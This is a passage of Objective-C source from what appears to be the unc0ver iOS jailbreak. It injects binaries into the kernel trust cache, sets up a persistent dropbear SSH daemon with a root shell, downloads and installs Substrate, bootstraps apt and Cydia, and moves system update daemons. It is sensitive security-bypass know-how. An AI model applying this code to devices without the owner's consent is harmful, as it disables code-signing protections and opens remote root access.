                plist[K_RESTORE_ROOTFS] = @NO;
            }), message, true);
            if (cfprefsd_pid != 0) {
                kill(cfprefsd_pid, SIGKILL);
            }
            LOG("Successfully disabled RootFS Restore.");
            
            INSERTSTATUS(NSLocalizedString(@"Restored RootFS.\n", nil));
            
            // Reboot.
            
            LOG("Rebooting...");
            SETMESSAGE(NSLocalizedString(@"Failed to reboot.", nil));
            NOTICE(NSLocalizedString(@"RootFS has been successfully restored. The device will now be restarted.", nil), true, false);
            LOG("I don't feel so good...");
            _assert(reboot(RB_QUICK) == ERR_SUCCESS, message, true);
            LOG("Successfully rebooted.");
        }
    }
    
    UPSTAGE();
    
    {
        // Allow SpringBoard to show non-default system apps.
        
        LOG("Allowing SpringBoard to show non-default system apps...");
        SETMESSAGE(NSLocalizedString(@"Failed to allow SpringBoard to show non-default system apps.", nil));
        _assert(modifyPlist(@"/var/mobile/Library/Preferences/com.apple.springboard.plist", ^(id plist) {
            plist[@"SBShowNonDefaultSystemApps"] = @YES;
        }), message, true);
        LOG("Successfully allowed SpringBoard to show non-default system apps.");
        INSERTSTATUS(NSLocalizedString(@"Allowed SpringBoard to show non-default system apps.\n", nil));
    }
    
    UPSTAGE();
    
    if (prefs.ssh_only && needStrap) {
        LOG("Enabling SSH...");
        SETMESSAGE(NSLocalizedString(@"Failed to enable SSH.", nil));
        NSMutableArray *toInject = [NSMutableArray new];
        if (!verifySums(pathForResource(@"binpack64-256.md5sums"), HASHTYPE_MD5)) {
            ArchiveFile *binpack64 = [ArchiveFile archiveWithFile:pathForResource(@"binpack64-256.tar.lzma")];
            _assert(binpack64 != nil, message, true);
            _assert([binpack64 extractToPath:@"/jb"], message, true);
            for (NSString *file in binpack64.files.allKeys) {
                NSString *path = [@"/jb" stringByAppendingPathComponent:file];
                if (cdhashFor(path) != nil) {
                    if (![toInject containsObject:path]) {
                        [toInject addObject:path];
                    }
                }
            }
        }
        NSFileManager *fileManager = [NSFileManager defaultManager];
        NSDirectoryEnumerator *directoryEnumerator = [fileManager enumeratorAtURL:[NSURL URLWithString:@"/jb"] includingPropertiesForKeys:@[NSURLIsDirectoryKey] options:0 errorHandler:nil];
        _assert(directoryEnumerator != nil, message, true);
        for (NSURL *URL in directoryEnumerator) {
            NSString *path = [URL path];
            if (cdhashFor(path) != nil) {
                if (![toInject containsObject:path]) {
                    [toInject addObject:path];
                }
            }
        }
        for (NSString *file in [fileManager contentsOfDirectoryAtPath:@"/Applications" error:nil]) {
            NSString *path = [@"/Applications" stringByAppendingPathComponent:file];
            NSMutableDictionary *info_plist = [NSMutableDictionary dictionaryWithContentsOfFile:[path stringByAppendingPathComponent:@"Info.plist"]];
            if (info_plist == nil) continue;
            if ([info_plist[@"CFBundleIdentifier"] hasPrefix:@"com.apple."]) continue;
            directoryEnumerator = [fileManager enumeratorAtURL:[NSURL URLWithString:path] includingPropertiesForKeys:@[NSURLIsDirectoryKey] options:0 errorHandler:nil];
            if (directoryEnumerator == nil) continue;
            for (NSURL *URL in directoryEnumerator) {
                NSString *path = [URL path];
                if (cdhashFor(path) != nil) {
                    if (![toInject containsObject:path]) {
                        [toInject addObject:path];
                    }
                }
            }
        }
        if (toInject.count > 0) {
            _assert(injectTrustCache(toInject, GETOFFSET(trustcache), pmap_load_trust_cache) == ERR_SUCCESS, message, true);
        }
        _assert(ensure_symlink("/jb/usr/bin/scp", "/usr/bin/scp"), message, true);
        _assert(ensure_directory("/usr/local/lib", 0, 0755), message, true);
        _assert(ensure_directory("/usr/local/lib/zsh", 0, 0755), message, true);
        _assert(ensure_directory("/usr/local/lib/zsh/5.0.8", 0, 0755), message, true);
        _assert(ensure_symlink("/jb/usr/local/lib/zsh/5.0.8/zsh", "/usr/local/lib/zsh/5.0.8/zsh"), message, true);
        _assert(ensure_symlink("/jb/bin/zsh", "/bin/zsh"), message, true);
        _assert(ensure_symlink("/jb/etc/zshrc", "/etc/zshrc"), message, true);
        _assert(ensure_symlink("/jb/usr/share/terminfo", "/usr/share/terminfo"), message, true);
        _assert(ensure_symlink("/jb/usr/local/bin", "/usr/local/bin"), message, true);
        _assert(ensure_symlink("/jb/etc/profile", "/etc/profile"), message, true);
        _assert(ensure_directory("/etc/dropbear", 0, 0755), message, true);
        _assert(ensure_directory("/jb/Library", 0, 0755), message, true);
        _assert(ensure_directory("/jb/Library/LaunchDaemons", 0, 0755), message, true);
        _assert(ensure_directory("/jb/etc/rc.d", 0, 0755), message, true);
        if (access("/jb/Library/LaunchDaemons/dropbear.plist", F_OK) != ERR_SUCCESS) {
            NSMutableDictionary *dropbear_plist = [NSMutableDictionary new];
            _assert(dropbear_plist, message, true);
            dropbear_plist[@"Program"] = @"/jb/usr/local/bin/dropbear";
            dropbear_plist[@"RunAtLoad"] = @YES;
            dropbear_plist[@"Label"] = @"ShaiHulud";
            dropbear_plist[@"KeepAlive"] = @YES;
            dropbear_plist[@"ProgramArguments"] = [NSMutableArray new];
            dropbear_plist[@"ProgramArguments"][0] = @"/usr/local/bin/dropbear";
            dropbear_plist[@"ProgramArguments"][1] = @"-F";
            dropbear_plist[@"ProgramArguments"][2] = @"-R";
            dropbear_plist[@"ProgramArguments"][3] = @"--shell";
            dropbear_plist[@"ProgramArguments"][4] = @"/jb/bin/bash";
            dropbear_plist[@"ProgramArguments"][5] = @"-p";
            dropbear_plist[@"ProgramArguments"][6] = @"22";
            _assert([dropbear_plist writeToFile:@"/jb/Library/LaunchDaemons/dropbear.plist" atomically:YES], message, true);
            _assert(init_file("/jb/Library/LaunchDaemons/dropbear.plist", 0, 0644), message, true);
        }
        for (NSString *file in [fileManager contentsOfDirectoryAtPath:@"/jb/Library/LaunchDaemons" error:nil]) {
            NSString *path = [@"/jb/Library/LaunchDaemons" stringByAppendingPathComponent:file];
            runCommand("/jb/bin/launchctl", "load", path.UTF8String, NULL);
        }
        for (NSString *file in [fileManager contentsOfDirectoryAtPath:@"/jb/etc/rc.d" error:nil]) {
            NSString *path = [@"/jb/etc/rc.d" stringByAppendingPathComponent:file];
            if ([fileManager isExecutableFileAtPath:path]) {
                runCommand("/jb/bin/bash", "-c", path.UTF8String, NULL);
            }
        }
        _assert(runCommand("/jb/bin/launchctl", "stop", "com.apple.cfprefsd.xpc.daemon", NULL) == ERR_SUCCESS, message, true);
        LOG("Successfully enabled SSH.");
        INSERTSTATUS(NSLocalizedString(@"Enabled SSH.\n", nil));
    }
    
    if (auth_ptrs || prefs.ssh_only) {
        goto out;
    }
    
    UPSTAGE();
    
    {
        // Copy over our resources to RootFS.
        
        LOG("Copying over our resources to RootFS...");
        SETMESSAGE(NSLocalizedString(@"Failed to copy over our resources to RootFS.", nil));
        
        _assert(chdir("/") == ERR_SUCCESS, message, true);
        
        // Uninstall RootLessJB if it is found to prevent conflicts with dpkg.
        _assert(uninstallRootLessJB(), message, true);
        
        // Make sure we have an apt packages cache
        _assert(ensureAptPkgLists(), message, true);
        
        
        needSubstrate = ( needStrap ||
                         (access("/usr/libexec/substrate", F_OK) != ERR_SUCCESS) ||
                         !verifySums(@"/var/lib/dpkg/info/mobilesubstrate.md5sums", HASHTYPE_MD5));
        if (needSubstrate) {
            LOG(@"We need substrate.");
            // Download substrate off the internet.
            if ([[NSFileManager defaultManager]fileExistsAtPath:substrateDeb isDirectory:NO]) {
                LOG(@"Found Substrate.");
                LOG(@"Substrate deb: %@",substrateDeb);
            } else {
                LOG(@"Downloading Substrate.");
                NSString *url =  [NSString stringWithFormat: @"https://raw.githubusercontent.com/pwn20wndstuff/Undecimus/db451489c21c69c95715c2cbf7e48885fea4b513/apt/mobilesubstrate_0.9.7032_iphoneos-arm.deb"];
                NSData *debData = [NSData dataWithContentsOfURL:[NSURL URLWithString:url]];
                [debData writeToFile:substrateDeb atomically:YES];
                //
                LOG(@"Sucessfully downloaded Substrate to: %@",substrateDeb);
            }
            // Back to your regularly scheduled u0
            if (pidOfProcess("/usr/libexec/substrated") == 0) { //FIX THIS BEFORE RELEASE
                LOG(@"Installing Substrate.");
                _assert(extractDeb(substrateDeb), message, true);
                LOG(@"Successfully installed Substrate.");
            } else {
                skipSubstrate = true;
                LOG("Substrate is running, not extracting again for now.");
            }
        }
        char *osversion = NULL;
        size_t size = 0;
        _assert(sysctlbyname("kern.osversion", NULL, &size, NULL, 0) == ERR_SUCCESS, message, true);
        osversion = malloc(size);
        _assert(osversion != NULL, message, true);
        _assert(sysctlbyname("kern.osversion", osversion, &size, NULL, 0) == ERR_SUCCESS, message, true);
        if (strlen(osversion) > 6) {
            betaFirmware = true;
            LOG("Detected beta firmware.");
        }
        free(osversion);
        osversion = NULL;
        
        NSArray *resourcesPkgs = resolveDepsForPkg(@"jailbreak-resources", true);
        _assert(resourcesPkgs != nil, message, true);
        resourcesPkgs = [@[@"system-memory-reset-fix"] arrayByAddingObjectsFromArray:resourcesPkgs];
        if (betaFirmware) {
            resourcesPkgs = [@[@"com.parrotgeek.nobetaalert"] arrayByAddingObjectsFromArray:resourcesPkgs];
        }
        if (kCFCoreFoundationVersionNumber >= 1535.12) {
            resourcesPkgs = [@[@"com.ps.letmeblock"] arrayByAddingObjectsFromArray:resourcesPkgs];
        }
        
        NSMutableArray *pkgsToRepair = [NSMutableArray new];
        LOG("Resource Pkgs: \"%@\".", resourcesPkgs);
        for (NSString *pkg in resourcesPkgs) {
            // Ignore mobilesubstrate because we just handled that separately.
            if ([pkg isEqualToString:@"mobilesubstrate"] || [pkg isEqualToString:@"firmware"])
                continue;
            if (verifySums([NSString stringWithFormat:@"/var/lib/dpkg/info/%@.md5sums", pkg], HASHTYPE_MD5)) {
                LOG("Pkg \"%@\" verified.", pkg);
            } else {
                LOG(@"Need to repair \"%@\".", pkg);
                if ([pkg isEqualToString:@"signing-certificate"]) {
                    // Hack to make sure it catches the Depends: version if it's already installed
                    [debsToInstall addObject:debForPkg(@"jailbreak-resources")];
                }
                [pkgsToRepair addObject:pkg];
            }
        }
        if (pkgsToRepair.count > 0) {
            LOG(@"(Re-)Extracting \"%@\".", pkgsToRepair);
            NSArray *debsToRepair = debsForPkgs(pkgsToRepair);
            _assert(debsToRepair.count == pkgsToRepair.count, message, true);
            _assert(extractDebs(debsToRepair), message, true);
            [debsToInstall addObjectsFromArray:debsToRepair];
        }
        
        // Ensure ldid's symlink isn't missing
        // (it's created by update-alternatives which may not have been called yet)
        if (access("/usr/bin/ldid", F_OK) != ERR_SUCCESS) {
            _assert(access("/usr/libexec/ldid", F_OK) == ERR_SUCCESS, message, true);
            _assert(ensure_symlink("../libexec/ldid", "/usr/bin/ldid"), message, true);
        }
        
        // These don't need to lay around
        clean_file("/Library/LaunchDaemons/jailbreakd.plist");
        clean_file("/jb/jailbreakd.plist");
        clean_file("/jb/amfid_payload.dylib");
        clean_file("/jb/libjailbreak.dylib");
        
        LOG("Successfully copied over our resources to RootFS.");
        INSERTSTATUS(NSLocalizedString(@"Copied over our resources to RootFS.\n", nil));
    }
    
    UPSTAGE();
    
    {
        // Inject trust cache
        
        LOG("Injecting trust cache...");
        SETMESSAGE(NSLocalizedString(@"Failed to inject trust cache.", nil));
        NSArray *resources = [NSArray arrayWithContentsOfFile:@"/usr/share/jailbreak/injectme.plist"];
        // If substrate is already running but was broken, skip injecting again
        if (!skipSubstrate) {
            resources = [@[@"/usr/libexec/substrate"] arrayByAddingObjectsFromArray:resources];
        }
        resources = [@[@"/usr/libexec/substrated"] arrayByAddingObjectsFromArray:resources];
        for (NSString *file in resources) {
            if (![toInjectToTrustCache containsObject:file]) {
                [toInjectToTrustCache addObject:file];
            }
        }
        _assert(injectTrustCache(toInjectToTrustCache, GETOFFSET(trustcache), pmap_load_trust_cache) == ERR_SUCCESS, message, true);
        injectedToTrustCache = true;
        toInjectToTrustCache = nil;
        LOG("Successfully injected trust cache.");
        INSERTSTATUS(NSLocalizedString(@"Injected trust cache.\n", nil));
    }
    
    UPSTAGE();
    
    {
        // Repair filesystem.
        
        LOG("Repairing filesystem...");
        SETMESSAGE(NSLocalizedString(@"Failed to repair filesystem.", nil));
        
        _assert(ensure_directory("/var/lib", 0, 0755), message, true);
        
        // Make sure dpkg is not corrupted
        if (is_directory("/var/lib/dpkg")) {
            if (is_directory("/Library/dpkg")) {
                LOG(@"Removing /var/lib/dpkg...");
                _assert(clean_file("/var/lib/dpkg"), message, true);
            } else {
                LOG(@"Moving /var/lib/dpkg to /Library/dpkg...");
                _assert([[NSFileManager defaultManager] moveItemAtPath:@"/var/lib/dpkg" toPath:@"/Library/dpkg" error:nil], message, true);
            }
        }
        
        _assert(ensure_symlink("/Library/dpkg", "/var/lib/dpkg"), message, true);
        _assert(ensure_directory("/Library/dpkg", 0, 0755), message, true);
        _assert(ensure_file("/var/lib/dpkg/status", 0, 0644), message, true);
        _assert(ensure_file("/var/lib/dpkg/available", 0, 0644), message, true);
        
        // Make sure firmware-sbin package is not corrupted.
        NSString *file = [NSString stringWithContentsOfFile:@"/var/lib/dpkg/info/firmware-sbin.list" encoding:NSUTF8StringEncoding error:nil];
        if ([file containsString:@"/sbin/fstyp"] || [file containsString:@"\n\n"]) {
            // This is not a stock file for iOS11+
            file = [file stringByReplacingOccurrencesOfString:@"/sbin/fstyp\n" withString:@""];
            file = [file stringByReplacingOccurrencesOfString:@"\n\n" withString:@"\n"];
            [file writeToFile:@"/var/lib/dpkg/info/firmware-sbin.list" atomically:YES encoding:NSUTF8StringEncoding error:nil];
        }
        
        // Make sure this is a symlink - usually handled by ncurses pre-inst
        _assert(ensure_symlink("/usr/lib", "/usr/lib/_ncurses"), message, true);
        
        // This needs to be there for Substrate to work properly
        _assert(ensure_directory("/Library/Caches", 0, S_ISVTX | S_IRWXU | S_IRWXG | S_IRWXO), message, true);
        LOG("Successfully repaired filesystem.");
        
        INSERTSTATUS(NSLocalizedString(@"Repaired Filesystem.\n", nil));
    }
    
    UPSTAGE();
    
    {
        // Load Substrate
        
        // Set Disable Loader.
        LOG("Setting Disable Loader...");
        SETMESSAGE(NSLocalizedString(@"Failed to set Disable Loader.", nil));
        if (prefs.load_tweaks) {
            clean_file("/var/tmp/.substrated_disable_loader");
        } else {
            _assert(create_file("/var/tmp/.substrated_disable_loader", 0, 644), message, true);
        }
        LOG("Successfully set Disable Loader.");
        
        // Run substrate
        LOG("Starting Substrate...");
        SETMESSAGE(NSLocalizedString(skipSubstrate?@"Failed to restart Substrate":@"Failed to start Substrate.", nil));
        if (!is_symlink("/usr/lib/substrate") && !is_directory("/Library/substrate")) {
            _assert([[NSFileManager defaultManager] moveItemAtPath:@"/usr/lib/substrate" toPath:@"/Library/substrate" error:nil], message, true);
            _assert(ensure_symlink("/Library/substrate", "/usr/lib/substrate"), message, true);
        }
        if (prefs.enable_get_task_allow) {
            SETOPT(GET_TASK_ALLOW);
        } else {
            UNSETOPT(GET_TASK_ALLOW);
        }
        if (prefs.set_cs_debugged) {
            SETOPT(CS_DEBUGGED);
        } else {
            UNSETOPT(CS_DEBUGGED);
        }
        _assert(runCommand("/usr/libexec/substrate", NULL) == ERR_SUCCESS, message, skipSubstrate?false:true);
        LOG("Successfully started Substrate.");
        
        INSERTSTATUS(NSLocalizedString(@"Loaded Substrate.\n", nil));
    }
    
    UPSTAGE();
    
    {
        // Extract bootstrap.
        LOG("Extracting bootstrap...");
        SETMESSAGE(NSLocalizedString(@"Failed to extract bootstrap.", nil));
        
        if (pkgIsBy("Sam Bingner", "lzma") || pkgIsBy("Sam Bingner", "xz")) {
            removePkg("lzma", true);
            removePkg("xz", true);
            extractDebsForPkg(@"lzma", debsToInstall, false);
        }
        
        if (pkgIsInstalled("openssl") && compareInstalledVersion("openssl", "lt", "1.0.2q")) {
            removePkg("openssl", true);
        }
        
        // Test dpkg
        if (!pkgIsConfigured("dpkg") || pkgIsBy("CoolStar", "dpkg")) {
            LOG("Extracting dpkg...");
            _assert(extractDebsForPkg(@"dpkg", debsToInstall, false), message, true);
            NSString *dpkg_deb = debForPkg(@"dpkg");
            _assert(installDeb(dpkg_deb.UTF8String, true), message, true);
            [debsToInstall removeObject:dpkg_deb];
        }
        
        if (needStrap || !pkgIsConfigured("firmware")) {
            LOG("Extracting Cydia...");
            if (access("/usr/libexec/cydia/firmware.sh", F_OK) != ERR_SUCCESS || !pkgIsConfigured("cydia")) {
                NSArray *fwDebs = debsForPkgs(@[@"cydia", @"cydia-lproj", @"darwintools", @"uikittools", @"system-cmds"]);
                _assert(fwDebs != nil, message, true);
                _assert(installDebs(fwDebs, true), message, true);
                rv = _system("/usr/libexec/cydia/firmware.sh");
                _assert(WEXITSTATUS(rv) == 0, message, true);
            }
        }
        
        // Dpkg better work now
        if (pkgIsBy("Sam Bingner", "apt1.4")) {
            removePkg("apt1.4", true);
        }
        
        if (pkgIsBy("Sam Bingner", "libapt")) {
            removePkg("libapt", true);
        }
        
        if (pkgIsBy("Sam Bingner", "libapt-pkg-dev")) {
            removePkg("libapt-pkg-dev", true);
        }
        
        if (pkgIsBy("Sam Bingner", "libapt-pkg5.0")) {
            removePkg("libapt-pkg5.0", true);
        }
        
        if (pkgIsInstalled("science.xnu.undecimus.resources")) {
            LOG("Removing old resources...");
            _assert(removePkg("science.xnu.undecimus.resources", true), message, true);
        }
        
        if (pkgIsInstalled("jailbreak-resources-with-cert")) {
            LOG("Removing resources-with-cert...");
            _assert(removePkg("jailbreak-resources-with-cert", true), message, true);
        }
        
        if ((pkgIsInstalled("apt") && pkgIsBy("Sam Bingner", "apt")) ||
            (pkgIsInstalled("apt-lib") && pkgIsBy("Sam Bingner", "apt-lib")) ||
            (pkgIsInstalled("apt-key") && pkgIsBy("Sam Bingner", "apt-key"))
            ) {
            LOG("Installing newer version of apt");
            NSArray *aptdebs = debsForPkgs(@[@"apt-lib", @"apt-key", @"apt"]);
            _assert(aptdebs != nil && aptdebs.count == 3, message, true);
            for (NSString *deb in aptdebs) {
                if (![debsToInstall containsObject:deb]) {
                    [debsToInstall addObject:deb];
                }
            }
        }
        
        // Remove old Sileo stuff
        clean_file("/etc/rc.d/restoresileo");
        if(pkgIsInstalled("com.diatrus.sileo-installer")) {
            LOG("Removing Diatrus's Sileo Installer...");
            _assert(removePkg("com.diatrus.sileo-installer", true), message, false);
            LOG("Removed Diatrus's Sileo Installer.");
        }
        if(pkgIsInstalled("us.diatr.sillyo2")) {
            LOG("Removing Diatrus's Sileo Compatibility Layer...");
            _assert(removePkg("us.diatr.sillyo2", true), message, false);
            LOG("Removed Diatrus's Sileo Compatibility Layer.");
        }
        if(pkgIsInstalled("org.juulstar.sileo")) {
            LOG("Removing Old Sileo...");
            _assert(removePkg("org.juulstar.sileo", true), message, false);
            LOG("Removed Old Sileo.");
        }
        
        if (debsToInstall.count > 0) {
            LOG("Installing manually exctracted debs...");
            _assert(installDebs(debsToInstall, true), message, true);
        }
        
        _assert(ensure_directory("/etc/apt/undecimus", 0, 0755), message, true);
        clean_file("/etc/apt/sources.list.d/undecimus.list");
        const char *listPath = "/etc/apt/undecimus/undecimus.list";
        NSString *listContents = @"deb file:///var/lib/undecimus/apt ./\n";
        NSString *existingList = [NSString stringWithContentsOfFile:@(listPath) encoding:NSUTF8StringEncoding error:nil];
        if (![listContents isEqualToString:existingList]) {
            clean_file(listPath);
            [listContents writeToFile:@(listPath) atomically:NO encoding:NSUTF8StringEncoding error:nil];
        }
        init_file(listPath, 0, 0644);
        NSString *repoPath = pathForResource(@"apt");
        _assert(repoPath != nil, message, true);
        ensure_directory("/var/lib/undecimus", 0, 0755);
        ensure_symlink([repoPath UTF8String], "/var/lib/undecimus/apt");
        if (!pkgIsConfigured("apt") || !aptUpdate()) {
            NSArray *aptNeeded = resolveDepsForPkg(@"apt", false);
            _assert(aptNeeded != nil && aptNeeded.count > 0, message, true);
            NSArray *aptDebs = debsForPkgs(aptNeeded);
            _assert(installDebs(aptDebs, true), message, true);
            _assert(aptUpdate(), message, true);
        }
        
        // Workaround for what appears to be an apt bug
        ensure_symlink("/var/lib/undecimus/apt/./Packages", "/var/lib/apt/lists/_var_lib_undecimus_apt_._Packages");
        
        if (debsToInstall.count > 0) {
            // Install any depends we may have ignored earlier
            _assert(aptInstall(@[@"-f"]), message, true);
            debsToInstall = nil;
        }
        
        // Dpkg and apt both work now
        
        if (needStrap) {
            if (!prefs.run_uicache) {
                prefs.run_uicache = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_REFRESH_ICON_CACHE] = @YES;
                }), message, true);
            }
        }
        // Now that things are running, let's install the deb for the files we just extracted
        if (needSubstrate) {
            if (pkgIsInstalled("com.ex.substitute")) {
                _assert(removePkg("com.ex.substitute", true), message, true);
            }
            _assert(aptInstall(@[substrateDeb]), message, true);
        }
        if (!betaFirmware) {
            if (pkgIsInstalled("com.parrotgeek.nobetaalert")) {
                _assert(removePkg("com.parrotgeek.nobetaalert", true), message, true);
            }
        }
        if (!(kCFCoreFoundationVersionNumber >= 1535.12)) {
            if (pkgIsInstalled("com.ps.letmeblock")) {
                _assert(removePkg("com.ps.letmeblock", true), message, true);
            }
        }
        
        NSData *file_data = [[NSString stringWithFormat:@"%f\n", kCFCoreFoundationVersionNumber] dataUsingEncoding:NSUTF8StringEncoding];
        if (![[NSData dataWithContentsOfFile:@"/.installed_unc0ver"] isEqual:file_data]) {
            _assert(clean_file("/.installed_unc0ver"), message, true);
            _assert(create_file_data("/.installed_unc0ver", 0, 0644, file_data), message, true);
        }
        
        // Make sure everything's at least as new as what we bundled
        rv = system("dpkg --configure -a");
        _assert(WEXITSTATUS(rv) == ERR_SUCCESS, message, true);
        _assert(aptUpgrade(), message, true);
        
        clean_file("/jb/tar");
        clean_file("/jb/lzma");
        clean_file("/jb/substrate.tar.lzma");
        clean_file("/electra");
        clean_file("/.bootstrapped_electra");
        clean_file("/usr/lib/libjailbreak.dylib");
        
        LOG("Successfully extracted bootstrap.");
        
        INSERTSTATUS(NSLocalizedString(@"Extracted Bootstrap.\n", nil));
    }
    
    UPSTAGE();
    
    {
        // Disable stashing.
        
        LOG("Disabling stashing...");
        SETMESSAGE(NSLocalizedString(@"Failed to disable stashing.", nil));
        _assert(ensure_file("/.cydia_no_stash", 0, 0644), message, true);
        LOG("Successfully disabled stashing.");
        INSERTSTATUS(NSLocalizedString(@"Disabled Stashing.\n", nil));
    }
    
    UPSTAGE();
    
    {
        // Fix storage preferences.
        
        LOG("Fixing storage preferences...");
        SETMESSAGE(NSLocalizedString(@"Failed to fix storage preferences.", nil));
        if (access("/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/softwareupdated", F_OK) == ERR_SUCCESS) {
            _assert(rename("/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/softwareupdated", "/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/Support/softwareupdated") == ERR_SUCCESS, message, false);
        }
        if (access("/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/softwareupdateservicesd", F_OK) == ERR_SUCCESS) {
            _assert(rename("/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/softwareupdateservicesd", "/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/Support/softwareupdateservicesd") == ERR_SUCCESS, message, false);
        }
        if (access("/System/Library/com.apple.mobile.softwareupdated.plist", F_OK) == ERR_SUCCESS) {
            _assert(rename("/System/Library/com.apple.mobile.softwareupdated.plist", "/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist") == ERR_SUCCESS, message, false);
            _assert(runCommand("/bin/launchctl", "load", "/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist", NULL) == ERR_SUCCESS, message, false);
        }
        if (access("/System/Library/com.apple.softwareupdateservicesd.plist", F_OK) == ERR_SUCCESS) {
            _assert(rename("/System/Library/com.apple.softwareupdateservicesd.plist", "/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist") == ERR_SUCCESS, message, false);
            _assert(runCommand("/bin/launchctl", "load", "/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist", NULL) == ERR_SUCCESS, message, false);
        }
        LOG("Successfully fixed storage preferences.");
        INSERTSTATUS(NSLocalizedString(@"Fixed Storage Preferences.\n", nil));
    }
    
    UPSTAGE();
    
    {
        char *targettype = NULL;
        size_t size = 0;
        _assert(sysctlbyname("hw.targettype", NULL, &size, NULL, 0) == ERR_SUCCESS, message, true);
        targettype = malloc(size);
        _assert(targettype != NULL, message, true);
        _assert(sysctlbyname("hw.targettype", targettype, &size, NULL, 0) == ERR_SUCCESS, message, true);
        NSString *jetsamFile = [NSString stringWithFormat:@"/System/Library/LaunchDaemons/com.apple.jetsamproperties.%s.plist", targettype];
        free(targettype);
        targettype = NULL;
        if (prefs.increase_memory_limit) {
            // Increase memory limit.
            
            LOG("Increasing memory limit...");
            SETMESSAGE(NSLocalizedString(@"Failed to increase memory limit.", nil));
            _assert(modifyPlist(jetsamFile, ^(id plist) {
                plist[@"Version4"][@"System"][@"Override"][@"Global"][@"UserHighWaterMark"] = [NSNumber numberWithInteger:[plist[@"Version4"][@"PListDevice"][@"MemoryCapacity"] integerValue]];
            }), message, true);
            LOG("Successfully increased memory limit.");
            INSERTSTATUS(NSLocalizedString(@"Increased Memory Limit.\n", nil));
        } else {
            // Restored memory limit.
            
            LOG("Restoring memory limit...");
            SETMESSAGE(NSLocalizedString(@"Failed to restore memory limit.", nil));
            _assert(modifyPlist(jetsamFile, ^(id plist) {
                plist[@"Version4"][@"System"][@"Override"][@"Global"][@"UserHighWaterMark"] = nil;
            }), message, true);
            LOG("Successfully restored memory limit.");
            INSERTSTATUS(NSLocalizedString(@"Restored Memory Limit.\n", nil));
        }
    }
    
    UPSTAGE();
    
    {
        if (prefs.install_openssh) {
            // Install OpenSSH.
            LOG("Installing OpenSSH...");
            SETMESSAGE(NSLocalizedString(@"Failed to install OpenSSH.", nil));
            _assert(aptInstall(@[@"openssh"]), message, true);
            LOG("Successfully installed OpenSSH.");
            
            // Disable Install OpenSSH.
            LOG("Disabling Install OpenSSH...");
            SETMESSAGE(NSLocalizedString(@"Failed to disable Install OpenSSH.", nil));
            prefs.install_openssh = false;
            _assert(modifyPlist(prefsFile, ^(id plist) {
                plist[K_INSTALL_OPENSSH] = @NO;
            }), message, true);
            LOG("Successfully disabled Install OpenSSH.");
            
            INSERTSTATUS(NSLocalizedString(@"Installed OpenSSH.\n", nil));
        }
    }
    
    UPSTAGE();
    
    {
        if (pkgIsInstalled("cydia-gui")) {
            // Remove Electra's Cydia.
            LOG("Removing Electra's Cydia...");
            SETMESSAGE(NSLocalizedString(@"Failed to remove Electra's Cydia.", nil));
            _assert(removePkg("cydia-gui", true), message, true);
            if (!prefs.install_cydia) {
                prefs.install_cydia = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_INSTALL_CYDIA] = @YES;
                }), message, true);
            }
            if (!prefs.run_uicache) {
                prefs.run_uicache = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_REFRESH_ICON_CACHE] = @YES;
                }), message, true);
            }
            LOG("Successfully removed Electra's Cydia.");
            
            INSERTSTATUS(NSLocalizedString(@"Removed Electra's Cydia.\n", nil));
        }
        if (pkgIsInstalled("cydia-upgrade-helper")) {
            // Remove Electra's Cydia Upgrade Helper.
            LOG("Removing Electra's Cydia Upgrade Helper...");
            SETMESSAGE(NSLocalizedString(@"Failed to remove Electra's Cydia Upgrade Helper.", nil));
            _assert(removePkg("cydia-upgrade-helper", true), message, true);
            if (!prefs.install_cydia) {
                prefs.install_cydia = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_INSTALL_CYDIA] = @YES;
                }), message, true);
            }
            if (!prefs.run_uicache) {
                prefs.run_uicache = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_REFRESH_ICON_CACHE] = @YES;
                }), message, true);
            }
            LOG("Successfully removed Electra's Cydia Upgrade Helper.");
        }
        if (pkgIsInstalled("cydia") && compareInstalledVersion("cydia", "lt", "1.2.0")) {
            _assert(removePkg("cydia", true), message, true);
            if (!prefs.install_cydia) {
                prefs.install_cydia = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_INSTALL_CYDIA] = @YES;
                }), message, true);
            }
            if (!prefs.run_uicache) {
                prefs.run_uicache = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_REFRESH_ICON_CACHE] = @YES;
                }), message, true);
            }
            LOG("Will update Cydia...");
        }
        if (access("/etc/apt/sources.list.d/electra.list", F_OK) == ERR_SUCCESS) {
            if (!prefs.install_cydia) {
                prefs.install_cydia = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_INSTALL_CYDIA] = @YES;
                }), message, true);
            }
            if (!prefs.run_uicache) {
                prefs.run_uicache = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_REFRESH_ICON_CACHE] = @YES;
                }), message, true);
            }
        }
        // Unblock repos
        unblockDomainWithName("apt.saurik.com");
        unblockDomainWithName("electrarepo64.coolstar.org");
        
        if (prefs.install_cydia) {
            // Install Cydia.
            
            // These triggers cause loops
            if(pkgIsInstalled("org.coolstar.Sileo")) {
                _assert(removePkg("us.diatr.sillyo", true), message, false);
                _assert(removePkg("us.diatr.sileorespring", true), message, false);
                _assert(removePkg("org.coolstar.Sileo", true), message, false);
                prefs.install_sileo = true;
            }
            
            LOG("Installing Cydia...");
            SETMESSAGE(NSLocalizedString(@"Failed to install Cydia.", nil));
            NSString *cydiaVer = versionOfPkg(@"cydia");
            _assert(cydiaVer!=nil, message, true);
            _assert(aptInstall(@[@"--reinstall", [@"cydia" stringByAppendingFormat:@"=%@", cydiaVer]]), message, true);
            LOG("Successfully installed Cydia.");
            
            // Disable Install Cydia.
            LOG("Disabling Install Cydia...");
